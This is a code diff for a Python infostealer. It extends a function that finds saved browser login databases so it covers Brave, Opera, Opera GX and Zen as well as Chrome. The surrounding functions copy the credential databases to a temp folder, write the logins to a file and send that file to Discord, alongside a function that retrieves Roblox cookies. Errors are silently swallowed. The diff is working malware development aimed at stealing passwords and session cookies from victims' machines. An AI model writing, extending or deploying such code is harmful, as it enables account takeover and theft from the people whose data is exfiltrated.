@@ -264,14 +264,22 @@ def retrieve_roblox_cookies():
 def get_login_data_path():
     try:
         user_profile = os.environ['USERPROFILE']
-        base_path = os.path.join(user_profile, r"AppData\Local\Google\Chrome\User Data")
-        for profile in ["Default", "Profile 1", "Profile 2"]:
-            candidate = os.path.join(base_path, profile, "Login Data")
-            if os.path.exists(candidate):
-                return candidate
+        base_paths = {
+            "Chrome": os.path.join(user_profile, r"AppData\Local\Google\Chrome\User Data"),
+            "Brave": os.path.join(user_profile, r"AppData\Local\BraveSoftware\Brave-Browser\User Data"),
+            "Opera": os.path.join(user_profile, r"AppData\Roaming\Opera Software\Opera Stable"),
+            "Opera GX": os.path.join(user_profile, r"AppData\Roaming\Opera Software\Opera GX Stable"),
+            "Zen": os.path.join(user_profile, r"AppData\Local\Zen\Zen\User Data")
+        }
+
+        for browser, base_path in base_paths.items():
+            for profile in ["Default", "Profile 1", "Profile 2"]:
+                candidate = os.path.join(base_path, profile, "Login Data")
+                if os.path.exists(candidate):
+                    return candidate, browser
     except:
         pass
-    return None
+    return None, None
 
 def copy_database(source_path, temp_path):
     try:
@@ -322,11 +330,11 @@ def send_file_to_discord(file_path):
 
 def collect_chrome_logins():
     try:
-        original_db = get_login_data_path()
+        original_db, browser = get_login_data_path()
         if not original_db:
             return
 
-        temp_db = os.path.join(os.environ['TEMP'], "LoginData_Copy.db")
+        temp_db = os.path.join(os.environ['TEMP'], f"{browser}_LoginData_Copy.db")
         if not copy_database(original_db, temp_db):
             return
 
@@ -334,7 +342,7 @@ def collect_chrome_logins():
         if not logins:
             return
 
-        temp_txt = os.path.join(os.environ['TEMP'], "chrome_logins.txt")
+        temp_txt = os.path.join(os.environ['TEMP'], f"{browser}_logins.txt")
         write_to_file(logins, temp_txt)
         send_file_to_discord(temp_txt)
     except:
